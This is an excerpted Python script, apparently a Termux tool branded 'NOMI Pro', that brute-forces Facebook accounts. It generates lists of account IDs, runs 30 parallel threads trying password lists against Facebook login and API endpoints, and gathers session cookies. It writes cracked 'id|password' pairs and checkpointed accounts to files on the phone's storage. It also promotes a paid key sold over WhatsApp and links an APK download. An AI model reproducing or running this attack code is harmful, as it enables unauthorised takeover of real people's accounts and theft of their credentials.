...
os.system('xdg-open https://www.youtube.com/@Star-Editer/')
...
logo=("""\033[1;37m
 d8b   db  .d88b.  .88b  d88. d888888b 
888o  88 .8P  Y8. 88'YbdP`88   `88'   
88V8o 88 88    88 88  88  88    88    
88 V8o88 88    88 88  88  88    88    \033[1;34m𝐏 \033[1;37m
88  V888 `8b  d8' 88  88  88   .88.   \033[1;31m 𝐑\033[1;37m
VP   V8P  `Y88P'  YP  YP  YP Y888888P \033[1;35m𝐎 \033[1;37m
----------------------------------------------
 Author    : NOMAN
 Github    : NOMI110
 Facebook  : MR.NOMI
 ...
 Type type : free
 Version   : 0.0
 Whatsapp : +92 319 4904242
 Me editor : all users
----------------------------------------------
 NOMI Pro version 0.0
 For Haters: hi everyone 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/NOMI_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi NOMI Sir, I Need To Buy Your Paid NOMI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python NOMI.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as NOMI:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NOMI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        NOMI=session.cookies.get_dict().keys()
                        if "c_user" in NOMI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NOMI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NOMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in NOMI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NOMI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NOMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NOMI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NOMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/NOMI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [NOMI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/NOMI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [NOMI-OK] '+uid+' | '+pas+'\033[1;97m')
